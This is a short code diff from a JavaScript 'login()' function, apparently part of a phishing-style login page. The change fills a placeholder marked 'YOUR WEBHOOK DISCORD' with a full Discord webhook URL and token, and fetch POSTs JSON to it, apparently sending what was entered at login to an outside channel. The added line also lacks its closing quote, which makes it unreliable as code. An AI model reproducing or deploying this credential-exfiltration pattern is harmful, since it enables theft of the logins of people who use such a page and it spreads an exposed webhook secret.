@@ -17,7 +17,7 @@ function login() {
         };
 
         // YOUR WEBHOOK DISCORD
-        fetch('https://discord.com/api/webhooks/', {
+        fetch('https://discord.com/api/webhooks/1215543172764143616/nXdVTBL4NXbxbEel8S0_ETIPgkL9lY6Q_F_b_FuZx_yX4Ys1_vZt48zkH1JDx4RK1PEG, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
